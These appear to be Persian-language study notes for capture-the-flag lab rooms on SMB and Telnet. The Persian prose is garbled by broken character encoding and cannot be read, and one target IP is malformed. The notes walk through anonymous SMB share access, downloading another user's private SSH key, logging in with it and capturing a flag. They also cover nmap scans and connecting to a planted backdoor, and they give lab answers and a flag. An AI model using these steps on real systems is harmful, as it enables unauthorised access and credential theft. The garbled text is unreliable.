			1. Ø¨Ø§ Ø¨Ø§Ø² Ú©Ø±Ø¯Ù† ÙØ§ÛŒÙ„ Ù…ØªÙˆØ¬Ù‡ Ù…ÛŒØ´ÙˆÛŒÙ… Ú©Ù‡ ÙØ§ÛŒÙ„ Ù†Ø§Ù…Ù‡ Ø§ÛŒ Ø§Ø² John Cactus Ø¨Ù‡ James Ø§Ø³Øª Ú©Ù‡ James Ù…Ø¯ÛŒØ± Ø¯Ù¾Ø§Ø±ØªÙ…Ø§Ù† Ù…ÛŒØ¨Ø§Ø´Ø¯.
			2. Ù‡Ù…Ú†Ù†ÛŒÙ† Ù…ØªÙˆØ¬Ù‡ Ø´Ø¯ÛŒÙ… Ú©Ù‡ Ø³Ø±ÙˆÛŒØ³ SSH Ø¨Ø±Ø§ÛŒ John Cactus Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ Ø´Ø¯Ù‡ Ø§Ø³ØªØŒ Ø¯Ø± Ù†ØªÛŒØ¬Ù‡ ÙÙˆÙ„Ø¯Ø± `.ssh` Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ù…Ù‡Ù… Ø§Ø³Øª.
				1. ![[Pasted image 20240716175851.png]]
		5. `cd .ssh`
			1. Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ú©Ù„ÛŒØ¯ Ù‡Ø§ÛŒ Ù…ÙˆØ±Ø¯ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø±Ø§ Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ù†ÛŒÙ… Ú©Ù‡ Ú©Ù„ÛŒØ¯ `id_rsa` Ø¨Ø¯Ø±Ø¯ Ù…Ø§ Ù…ÛŒØ®ÙˆØ±Ø¯.
		6. `get id_rsa`
				1. Ø­Ø§Ù„ Ú©Ù„ÛŒØ¯ Ø±Ø§ Ø¯Ø§Ù†Ù„ÙˆØ¯ Ù…ÛŒÚ©Ù†ÛŒÙ… ØªØ§ Ø¨ØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø§ÛŒÙ† Ú©Ù„ÛŒØ¯ Ø¨Ø± Ø¨Ø³ØªØ± SSH Ù…ØªØµÙ„ Ø´ÙˆÛŒÙ….
1. *Connect to Target using `ssh`*
	1. Ø­Ø§Ù„ Ú©Ù‡ Ú©Ù„ÛŒØ¯ SSH Ø±Ø§ Ø¨Ø± Ø±ÙˆÛŒ Ù…Ø§Ø´ÛŒÙ† Ù„ÙˆÚ©Ø§Ù„ Ø¯Ø§Ù†Ù„ÙˆØ¯ Ú©Ø±Ø¯ÛŒÙ… Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¨Ø± Ø¨Ø³ØªØ± SSH Ù…ØªØµÙ„ Ø´ÙˆÛŒÙ….
	2. Ø¨Ø±Ø§ÛŒ Ø§ÛŒÙ†Ú©Ø§Ø± Ø§Ø¨ØªØ¯Ø§ Ø¨Ø§ÛŒØ¯ Ù…Ø¬ÙˆØ² Ú©Ù„ÛŒØ¯ Ø±Ø§ Ø¨Ø§ `chmod` ØµØ§Ø¯Ø± Ú©Ù†ÛŒÙ… Ùˆ Ø³Ù¾Ø³ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… ÙØ§ÛŒÙ„ Ú©Ù„ÛŒØ¯ Ø±Ø§ Ø¨Ø§Ø² Ú©Ù†ÛŒÙ…:
	3. `sudo chmod 600 id_rsa ; sudo cat id_rsa`
		1. ![[Pasted image 20240716180448.png]]
	4. Ø­Ø§Ù„ Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¨ÙˆØ³ÛŒÙ„Ù‡ `ssh -i id-rsa cactus@10.10..50.26` Ù…ØªØµÙ„ Ø´ÙˆÛŒÙ….
		1. `ssh -i id_rsa cactus@10.10..50.26`
			1. ![[Pasted image 20240716180650.png]]
	5. Ø­Ø§Ù„ Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¨ÙˆØ³ÛŒÙ„Ù‡ ssh Ù…ØªØµÙ„ Ø´Ø¯ÛŒÙ…. Ú©Ø§ÙÛŒØ³Øª ÙØ§ÛŒÙ„ Ù‡Ø§ÛŒ Ù…Ø§Ø´ÛŒÙ† Ø±Ø§ Ù„ÛŒØ³Øª Ú©Ù†ÛŒÙ… Ùˆ Ø³Ù¾Ø³ `smb.txt` Ø±Ø§ Ø¨Ø§Ø² Ú©Ù†ÛŒÙ… ØªØ§ Ù…Ù‚Ø¯Ø§Ø± ÙÙ„Ú¯ Ø±Ø§ Ø¨Ø¯Ø³Øª Ø¨ÛŒØ§ÙˆØ±ÛŒÙ….
		1. `THM{smb_is_fun_eh?}`
3. *TASK 2 - Q_&_A*
	1. *Ø³ÙˆØ§Ù„ Ø§ÙˆÙ„*:
		1. Correct Syntax for `smclient` connect to 10.10.10.2 and `Secret` share using `suite` user? `smbclient //10.10.10.2/secret -U suit`
	2. *Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ…*:
		1. Does the share anonymous access? `Y`
	3. *Ø³ÙˆØ§Ù„ Ø³ÙˆÙ…*:
		1. Whats interesting Document or Valuable Information in target files. Who Can Assume this profile belongs to? `John Cactus`
		2. Ù…ÛŒÚ¯ÙˆÛŒØ¯ Ø¯Ø± ÙØ§ÛŒÙ„ Ù‡Ø§ÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ú†Ø±Ø®ÛŒ Ø¨Ø²Ù†ÛŒØ¯ ØªØ§ Ø¨Ù‡ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø§Ø±Ø²Ø´Ù…Ù†Ø¯ÛŒ Ø¨Ø±Ø³ÛŒØ¯ Ùˆ Ù…ØªÙˆØ¬Ù‡ Ø´ÙˆÛŒØ¯ Ù†Ø§Ù… Ú©Ø³ÛŒ Ú©Ù‡ Ø§ÛŒÙ† Share Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ø§Ùˆ Ú¯Ø°Ø§Ø´ØªÙ‡ Ø§Ù†Ø¯ Ú†ÛŒØ³ØªØŸ `John Cactus`
	4. *Ø³ÙˆØ§Ù„ Ú†Ù‡Ø§Ø±Ù…*:
		1. Whats Services configured to allow him(John Cactus)? `ssh`
	5. *Ø³ÙˆØ§Ù„ Ù¾Ù†Ø¬Ù…*:
		1. What Directory in share should we look in ? `.ssh`
	6. *Ø³ÙˆØ§Ù„ Ø´Ø´Ù…*:
		1. Which Keys most useful to us in `.ssh` directory? `id_rsa`
	7. *Ø³ÙˆØ§Ù„ Ù‡ÙØªÙ…*:
		1. Ø¨ÙˆØ³ÛŒÙ„Ù‡ Ø³Ø±ÙˆÛŒØ³ `ssh` Ùˆ ÛŒÙˆØ²Ø±Ù†ÛŒÙ… `Cactus` Ùˆ Ú©Ù„ÛŒØ¯` id_rsa` Ø¨Ø¯Ø³Øª Ø¢Ù…Ø¯Ù‡ Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø¨Ø± Ø¨Ø³ØªØ± ssh Ù…ØªØµÙ„ Ø´ÙˆÛŒÙ… Ùˆ ÙØ§ÛŒÙ„ `smb.txt` Ø¯Ø±ÙˆÙ† Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø¨Ø§Ø² Ù…ÛŒÚ©Ù†ÛŒÙ… ØªØ§ ÙÙ„Ú¯ Ø±Ø§ Ø¨Ø¯Ø³Øª Ø¨ÛŒØ§ÙˆØ±ÛŒÙ… Ùˆ Ù…Ù‚Ø¯Ø§Ø± Ø¢Ù†Ø±Ø§ Ø¯Ø± Ø¬ÙˆØ§Ø¨ Ø³ÙˆØ§Ù„ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯:
			1. `THM{smb_is_fun_eh?}`
-----
```sh
smbclient //10.10.10.2/profiles
'Paswword for [WORKGROUP\root]' #Leave it blank
ls
cat Working From Home Information.txt "don't work"
more Working From Home Information.txt
cd .ssh
get id_rsa
```
----
```sh terminal-2
sudo chmod 600 id_rsa
sudo cat id_rsa
ssh -i id_rsa cactus@10.10..50.26
```
### Telnet Exploitation - E56
#### Definition & Instruction
##### What is Telnet?
- **Telnet(Telecommunication Network)** - `tcp/23`
- Ù¾Ø±ÙˆØªÚ©Ù„ Telnet ÛŒÚ© *Application Protocol* Ø§Ø³Øª. Ú©Ù„Ø§ÛŒÙ†Øª Telnet Ø¨Ø§ Ù…ØªØµÙ„ Ø´Ø¯Ù† Ø¨Ù‡ Ù‡Ø§Ø³ØªÛŒ Ú©Ù‡ Ø³Ø±ÙˆØ± Telnet Ø¯Ø± Ø¢Ù† Ø±Ø§Ù‡ Ø§Ù†Ø¯Ø§Ø²ÛŒ Ø´Ø¯Ù‡ Ø§Ø³Øª Ù…ÛŒØªÙˆØ§Ù†Ø¯ Ú©Ø§Ù…Ù†Ø¯ Ù‡Ø§ÛŒ Telnet Ø±Ø§ Ø¨Ø± Ø±ÙˆÛŒ Ø¢Ù† Ù…Ø§Ø´ÛŒÙ† Ø¨ØµÙˆØ±Øª Remote Ø§Ø¬Ø±Ø§ Ú©Ù†Ø¯.
- Ø¯Ø± ÙˆØ§Ù‚Ø¹ Client Telnet Ú©Ø§Ù†Ú©Ø´Ù†ÛŒ Ø±Ø§ Ø¨Ù‡ Ø³Ù…Øª Server Telnet Ø¨Ø±Ù‚Ø±Ø§Ø± Ù…ÛŒÚ©Ù†Ø¯ Ùˆ Ø¯Ø± ØµÙˆØ±ØªÛŒÚ©Ù‡ Authentication Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´ÙˆØ¯ØŒ ÛŒÚ© Virtual Terminal Ø§Ø² Ù…Ø§Ø´ÛŒÙ† Ø³Ø±ÙˆØ± Ø¯Ø± Ø§Ø®ØªÛŒØ§Ø± Ú©Ù„Ø§ÛŒÙ†Øª telnet Ù‚Ø±Ø§Ø± Ù…ÛŒØ¯Ù‡Ø¯ Ú©Ù‡ Ú©Ù„Ø§ÛŒÙ†Øª Ù…ÛŒØªÙˆØ§Ù†Ø¯ ØªÙ…Ø§Ù… Ú©Ø§Ù…Ù†Ø¯ Ù‡Ø§ÛŒ Bash Ø±Ø§ Ø¯Ø± Ø¢Ù† V-Terminal Ø§Ø¬Ø±Ø§ Ú©Ù†Ø¯.
- Ø§Ø² Ø¶Ø¹Ù Ù‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ Telnet Ø§ÛŒÙ† Ø§Ø³Øª Ú©Ù‡ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨ØµÙˆØ±Øª Plain Text Ø¨ÛŒÙ† Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± Ø§Ø±Ø³Ø§Ù„ Ù…ÛŒØ´ÙˆÙ†Ø¯ Ùˆ Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ù‡ÛŒÚ† Ø±Ù…Ø²Ù†Ú¯Ø§Ø±ÛŒ Ø¨Ø± Ø±ÙˆÛŒ Ø¯Ø§Ø¯Ù‡ Ù‡Ø§ÛŒ Ø±Ø¯ Ùˆ Ø¨Ø¯Ù„ Ø´Ø¯Ù‡ Ù…ÛŒØ§Ù† Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± ØµÙˆØ±Øª Ù†Ù…ÛŒÚ¯ÛŒØ±Ø¯.
- Ø¨Ù‡ Ù‡Ù…ÛŒÙ† Ø¯Ù„ÛŒÙ„ Ùˆ Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ø·Ø±Ù Ú©Ø±Ø¯Ù† Ø§ÛŒÙ† Ù…Ø´Ú©Ù„ Ø§Ù…Ù†ÛŒØªÛŒØŒ Ù¾Ø±ÙˆØªÚ©Ù„ SSH Ø¹Ø±Ø¶Ù‡ Ø´Ø¯ Ú©Ù‡ Ø¯Ù‚ÛŒÙ‚Ø§ Ù…Ø§Ù†Ù†Ø¯ Telnet Ú©Ø§Ø± Ù…ÛŒÚ©Ù†Ø¯ Ø¨Ø§ Ø§ÛŒÙ† ØªÙØ§ÙˆØª Ú©Ù‡ Ø¯Ø§Ø¯Ù‡ Ù‡Ø§ÛŒ Ø±Ø¯ Ùˆ Ø¨Ø¯Ù„ Ø´Ø¯Ù‡ Ø¨ÛŒÙ† Ú©Ù„Ø§ÛŒÙ†Øª Ùˆ Ø³Ø±ÙˆØ± Encrypted Ù…ÛŒØ´ÙˆÙ†Ø¯.
- *Ø§Ø³Ù„Ø§ÛŒØ¯*:
	- ![[Pasted image 20240713185114.png]]
##### Established Telnet Connection
Ø§Ø² Ú©Ø§Ù†Ú©Ø´Ù† Ù‡Ø§ÛŒ Telnet Ø¯Ø± Ú©Ø§Ø± Ú¯Ø°Ø§Ø´ØªÙ† Backdoor Ù‡Ø§ Ø¨Ø³ÛŒØ§Ø± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒØ´ÙˆØ¯. Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ù‚Ø±Ø§Ø±ÛŒ Ø§Ø±ØªØ¨Ø§Ø· Telnet Ø¨Ø§ÛŒØ¯ Ø¨Ù‡ Ù†Ø­Ùˆ Ø²ÛŒØ± Ø¹Ù…Ù„ Ú©Ù†ÛŒÙ… >>
	![[Pasted image 20240713190430.png]]
```sh
--------"Syntax"--------
telnet $IP $PORT

--------"Example"--------
telnet 192.168.10.1 12923
```
##### Telnet Enumeration & Scanning
- Ø§Ø² Ø§Ø³Ú©Ù†Ø± Nmap Ø¨Ø±Ø§ÛŒ Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±Ø¯Ù† Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³Ø±ÙˆÛŒØ³ Telnet Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ…. Ø¨Ø±Ø§ÛŒ Ø§ÛŒÙ†Ú©Ø§Ø± Ø¨Ø§ÛŒØ¯ Ø¨Ù‡ Ù†Ø­Ùˆ Ø²ÛŒØ± Ø¹Ù…Ù„ Ú©Ù†ÛŒÙ… >>
	![[Pasted image 20240713185502.png]]
- Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ø¨Ø±Ø§ÛŒ Ø§Ø³Ú©Ù† Telnet Ø¨ØµÙˆØ±Øª Ù¾ÛŒØ´ÙØ±Ø¶ Ø¨Ø§ÛŒØ¯ Ù¾ÙˆØ±Øª 23 Ø±Ø§ Ø§Ø³Ú©Ù† Ú©Ù†ÛŒÙ… Ú©Ù‡ Ø§ÛŒÙ†Ú©Ø§Ø± Ø±Ø§ Ø¨Ø§ Ú©Ø§Ù…Ù†Ø¯ Ø²ÛŒØ± Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒØ¯Ù‡ÛŒÙ…:
	1. `nmap -sS -T4 -p23 10.10.50.26`
1. Ø§Ù…Ø§ Ø¨Ø¯Ù„ÛŒÙ„ Ø§ÛŒÙ†Ú©Ù‡ Ù…Ù…Ú©Ù† Ø§Ø³Øª Ù¾ÙˆØ±Øª Ù¾ÛŒØ´ÙØ±Ø¶ Ø³Ø±ÙˆÛŒØ³ ØªÙˆØ³Ø· Ø§Ø¯Ù…ÛŒÙ† Ø¹ÙˆØ¶ Ø´Ø¯Ù‡ Ø¨Ø§Ø´Ø¯ØŒ Ø¯Ø± Ø§ÛŒÙ†ØµÙˆØ±Øª Ùˆ Ø¯Ø± Ø±ÙˆØ´ Ø§Ø³ØªØ§Ù†Ø¯Ø§Ø±Ø¯ Ø¨Ø§ÛŒØ¯ ØªÙ…Ø§Ù… Ù¾ÙˆØ±Øª Ù‡Ø§ÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø±Ø§ Ø§Ø³Ú©Ù† Ú©Ù†ÛŒÙ… Ú©Ù‡ Ø§ÛŒÙ†Ú©Ø§Ø± Ø±Ø§ Ø¨Ø§ Ø§Ø¶Ø§ÙÙ‡ Ú©Ø±Ø¯Ù† ÙÙ„Ú¯ `-p-` Ø¨Ù‡ Ú©Ø§Ù…Ù†Ø¯ Ù…Ø§Ù†Ù†Ø¯ Ø²ÛŒØ± Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒØ¯Ù‡ÛŒÙ…:
	1. `nmap -sS -T4 -p- 10.10.50.26`
		1. Ø¨Ø±Ø§ÛŒ Ø§Ù†Ø¬Ø§Ù… Ø§Ø³Ú©Ù† Ø¨Ø§ Ø³Ø±Ø¹Øª Ø¨Ø§Ù„Ø§
	2. `nmap -sS -sV -p- -O 10.10.50.26`
		1. Ø§ÛŒÙ† Ø§Ø³Ú©Ù† Ø²Ù…Ø§Ù† Ø¨ÛŒØ´ØªØ±ÛŒ Ù…ÛŒÚ¯ÛŒØ±Ø¯ Ø§Ù…Ø§ Ø¯Ù‚Øª Ùˆ Ø¬Ø²ÛŒØ§Øª Ø¨ÛŒØ´ØªØ±ÛŒ Ø¯Ø§Ø±Ø¯.
-----
```sh
nmap -sS -p23 10.10.50.26 #Only scan FTP-23 Port
nmap -sS -T4 -p- 10.10.50.26 # Way 1- Quick Scan all ports
nmap -sS -sV -p- -O 10.10.50.26 #Way 2 - Accurate Scan all ports
```
#### Practical Demo
##### TASK 5 - Understanding Telnet
0. *TASK 5 Q_&_A*
	1. *Ø³ÙˆØ§Ù„ Ø§ÙˆÙ„*
		1. Whats Telnet? `application protocol`
	2. *Ø³ÙˆØ§Ù„ Ø¯ÙˆÙ…*
		1. Whats has slowly replaced Telnet? `ssh`
	3. *Ø³ÙˆØ§Ù„ Ø³ÙˆÙ…*
		1. How would you connect a telnet server with the IP 10.10.10.3 on port 23?
		2. `telnet 10.10.10.3 23` or `telnet 10.10.10.3`
	4. *Ø³ÙˆØ§Ù„ Ú†Ù‡Ø§Ø±Ù…*
		1. Whats Lack of Telnet? `encryption`
	5. ØªØµÙˆÛŒØ±
		1. ![[Pasted image 20240713191337.png]]
##### TASK 6 - Enumerating Telnet
0. *Scanning Target*
	1. `sudo nmap -sS -sV -O 10.10.5.166` OS, Services Version & Vulnerability Scanning - *Ports under 1000*
		1. `-sS` TCP Syn Scan(Hidden Scan)
		2. `-sV` Services Version Detection
		3. `-O` OS Detection
		4. Results
			1. Ø¯Ø± Ø§ÛŒÙ† Ø§Ø³Ú©Ù† Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø¯Ø± Ø¨Ø®ÙˆØ±ÛŒ Ø±Ø§ Ù†ÛŒØ§ÙØªÛŒÙ…. Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ù‡Ø± 1000 Ù¾ÙˆØ±Øª Ø§Ø¨ØªØ¯Ø§ÛŒÛŒ Closed Ø¨ÙˆØ¯Ù†Ø¯. Ø¨Ù†Ø§Ø¨Ø±Ø§ÛŒÙ† Ø¨Ø§ÛŒØ¯ ØªÙ…Ø§Ù… Ù¾ÙˆØ±Øª Ù‡Ø§ Ø±Ø§ Ø§Ø³Ú©Ù† Ú©Ù†ÛŒÙ….
		5. Image
			1. ![[Pasted image 20240713193341.png]]
	2. `sudo nmap -sS -sV -O -p- 10.10.5.166` OS, Services & Version Scanning - *All Ports*
		1. Ù‡Ù†Ú¯Ø§Ù…ÛŒÚ©Ù‡ Ø¯Ø± Ù¾ÙˆØ±Øª Ù‡Ø§ÛŒ Ø²ÛŒØ± 1000  Ù¾ÙˆØ±ØªÛŒ Open Ù¾ÛŒØ¯Ø§ Ù†Ú©Ø±ÛŒÙ… Ø¨Ø§ÛŒØ¯ ØªÙ…Ø§Ù… 65535 Ù¾ÙˆØ±Øª Ø±Ø§ Ø§Ø³Ú©Ù† Ú©Ù†ÛŒÙ… ØªØ§ ÛŒÚ© Ù¾ÙˆØ±Øª Open Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ù†ÙÙˆØ° Ù¾ÛŒØ¯Ø§ Ú©Ù†ÛŒÙ….
		2. Ø¯Ø± Ù†ØªÛŒØ¬Ù‡ Ø§Ø³Ú©Ù† Ù¾ÙˆØ±Øª `8012` Ø±Ø§ Ù¾ÛŒØ¯Ø§ Ú©Ø±Ø¯ÛŒÙ… Ú©Ù‡ Open Ø§Ø³Øª.
			1. ![[Pasted image 20240713194310.png]]
		3. Ù‡Ù…Ú†Ù†ÛŒÙ† Ø¯Ø± Ù†ØªÛŒØ¬Ù‡ Ø§Ø³Ú©Ù† Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ø±Ø¯ÛŒÙ… Ú©Ù‡ ÛŒÚ© Ø§Ø³Ú©Ø±ÛŒÙ¾Øª `Backdoor` Ù‡Ù… Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ú©Ø§Ø± Ú¯Ø°Ø§Ø´ØªÙ‡ Ø´Ø¯Ù‡ Ø§Ø³Øª.
			1. ![[Pasted image 20240713194359.png]]
		4. Ø¨ØµÙˆØ±Øª Ø§Ø³ØªØ§Ù†Ø¯Ø§Ø±Ø¯ Ù†Ø§Ù… Username Ú©Ù‡ Ø§ÛŒÙ† Backdoor Ø±Ø§ Ú©Ø§Ø± Ú¯Ø°Ø§Ø´ØªÙ‡ Ø±Ø§ Ù‡Ù… Ø¨Ø±Ù…ÛŒØ¯Ø§Ø±ÛŒÙ…. Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ø¨Ø¯Ø³Øª Ø¢ÙˆØ±Ø¯Ù† ÛŒÙˆØ²Ø± Ù†ÛŒÙ… Ù‡Ø§ÛŒ ÛŒÚ© Ù…Ø§Ø´ÛŒÙ† Ø§Ø² Ù…Ù‡Ù…ØªØ±ÛŒÙ† Ù…Ø±Ø§Ø­Ù„ Enumerate Ùˆ Info Gathering Ù…ÛŒØ¨Ø§Ø´Ø¯. Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ ÛŒÙˆØ²Ø±Ù†ÛŒÙ… `SKIDY` Ù†Ø§Ù… Ø¯Ø§Ø±Ø¯:
			1. ![[Pasted image 20240713195016.png]]
1. *Established Telent Connection with Backdoor on Target machine*
	1. Ú¯ÙØªÛŒÙ… Ú©Ù‡ Ø§Ú©Ø«Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ù…ØªØµÙ„ Ø´Ø¯Ù† Ø¨Ù‡ Backdoor Ø§Ø² Ø³Ø±ÙˆÛŒØ³ Telnet Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒØ´ÙˆØ¯. Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù‡Ù… Ø¯Ø± Ø§Ø³Ú©Ù† Ù…ØªÙˆØ¬Ù‡ Ø´Ø¯ÛŒÙ… Ú©Ù‡ Backdoor Ø¨Ø± Ø±ÙˆÛŒ `tcp/8012` Ú©Ø§Ø± Ú¯Ø°Ø§Ø´ØªÙ‡ Ø´Ø¯Ù‡ Ø§Ø³Øª. Ø¨Ù†Ø§Ø¨Ø±Ø§ÛŒÙ† Ø¨Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ú©Ø§Ù…Ù†Ø¯ Ø²ÛŒØ± Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ Backdoor Ú©Ø§Ø± Ú¯Ø°Ø§Ø´ØªÙ‡ Ø´Ø¯Ù‡ Ù…ØªØµÙ„ Ø´ÙˆÛŒÙ…:
	2. `telnet 10.10.5.166 8012`
		1. ![[Pasted image 20240713200011.png]]
	3. **Ù†Ú©ØªÙ‡**: Ø§Ú¯Ø± Ø¯Ø± Ø§ØªØµØ§Ù„ Ø¨Ù‡ Backdoor Ø¯Ø± Ø§ÛŒÙ† Ù…Ø±Ø­Ù„Ù‡ Ø¨Ù‡ Ù…Ø´Ú©Ù„ Ø¨Ø±Ø®ÙˆØ±Ø¯ÛŒÙ…ØŒ Ø¨Ø§ÛŒØ¯ Ø¢ÛŒÙ¾ÛŒ Kali Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒÙ… Ùˆ Ø¨Ø± Ø±ÙˆÛŒ Ø¢ÛŒÙ¾ÛŒ Ø¨Ø§ Ø±Ù†Ø¬ Ø¢ÛŒÙ¾ÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª ØªÙ†Ø¸ÛŒÙ… Ú©Ù†ÛŒÙ…. Ù…Ø«Ù„Ø§ Ø¯Ø± Ø³Ù†Ø§Ø±ÛŒÙˆ Ù…Ø§ >>
	4. `target ip: 10.10.5.166/16` => 10.10.5.166/255.255.0.0
	5. `Kali IP shoud be 10.8.x.x/16` => 10.8.64.134/255.255.0.0
		1. ![[Pasted image 20240713195756.png]]
	6. Ù‡Ù…Ú†Ù†ÛŒÙ† Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ø§Ø² OpenVPN Ùˆ Ø¨Ø±Ù‚Ø±Ø§Ø±ÛŒ ØªØ§Ù†Ù„ Ù‡Ù… Ø¨Ø±Ø§ÛŒ Ù…ØªØµÙ„ Ø´Ø¯Ù† Ø¨Ù‡ Ø§ÛŒÙ† Ù…Ø§Ø´ÛŒÙ† Ùˆ Ø³Ù¾Ø³ Backdoor Ø¯Ø±ÙˆÙ† Ø¢Ù† Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒÙ….
2. *Listening Telnet Communications with tcpdump on Kali*
	1. Ø­Ø§Ù„ Ú©Ù‡ Ø¨Ù‡ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ù…ØªØµÙ„ Ø´Ø¯Ù‡ Ø§ÛŒÙ… Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ú©Ø§Ù…Ù†Ø¯ Ù‡Ø§ÛŒ Ù…Ø®ØªÙ„ÙÛŒ Ø±Ø§ Ø¨Ø± Ø±ÙˆÛŒ Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ…. Ø¯Ø± Ø§ÙˆÙ„ÛŒÙ† Ù‚Ø¯Ù… ÛŒÚ© Ø´Ù†ÙˆØ¯ `tcpdump` Ø±Ø§Ù‡ Ø§Ù†Ø¯Ø§Ø²ÛŒ Ù…ÛŒÚ©Ù†ÛŒÙ… Ùˆ Ø§Ø² Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Kali Ø±Ø§ Ping Ù…ÛŒÚ¯ÛŒØ±ÛŒÙ….
	2. Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ø§Ú¯Ø± Ø§Ù„Ø§Ù† `ifconfig` Ø±Ø§ Ø¯Ø± Kali Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ… Ù…ÛŒØªÙˆØ§Ù†ÛŒÙ… Ù…Ø´Ø§Ù‡Ø¯Ù‡ Ú©Ù†ÛŒÙ… Ú©Ù‡ Ø§ÛŒÙ†ØªØ±ÙÛŒØ³ Ø¬Ø¯ÛŒØ¯ÛŒ Ø¨Ù†Ø§Ù… `tun0` Ø§Ø¶Ø§ÙÙ‡ Ø´Ø¯Ù‡ Ø§Ø³Øª Ú©Ù‡ Ø§Ø² Ø·Ø±ÛŒÙ‚ Ø¢Ù† Ø¨Ù‡ Backdoor Ø¯Ø± Ù…Ø§Ø´ÛŒÙ† ØªØ§Ø±Ú¯Øª Ù…ØªØµÙ„ Ø´Ø¯Ù‡ Ø§ÛŒÙ…. Ø­Ø§Ù„ Ù…ÛŒØ®ÙˆØ§Ù‡ÛŒÙ… Ø§Ø² Ø·Ø±ÛŒÙ‚ Ø§ÛŒÙ† Ø§ÛŒÙ†ØªØ±ÙÛŒØ³ Ø´Ù†ÙˆØ¯ Ø¨Ø³ØªÙ‡ Ù‡Ø§ÛŒ icmp Ø±Ø§ Ø±Ø§Ù‡ Ø§Ù†Ø¯Ø§Ø²ÛŒ Ú©Ù†ÛŒÙ… >>
	3. `sudo tcpdump ip proto \\icmp -i tun0`
		1. ![[Pasted image 20240713200442.png]]
	4. Ø§ÛŒÙ† Ú©Ø§Ù…Ù†Ø¯ IP, Protocol ØªÙ…Ø§Ù… Ø¨Ø³ØªÙ‡ Ù‡Ø§ÛŒ ICMP Ø±Ø§ Ø´Ù†ÙˆØ¯ Ù…ÛŒÚ©Ù†Ø¯. Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ù‡Ø± Ú©Ø§Ù…Ù†Ø¯ `ping` Ú©Ù‡ Ø¯Ø± Ú©Ø§Ù†Ú©Ø´Ù† Telnet ØªØ§ÛŒÙ¾ Ø´ÙˆØ¯ Ø±Ø§ Ø´Ù†ÙˆØ¯ Ù…ÛŒÚ©Ù†Ø¯. 
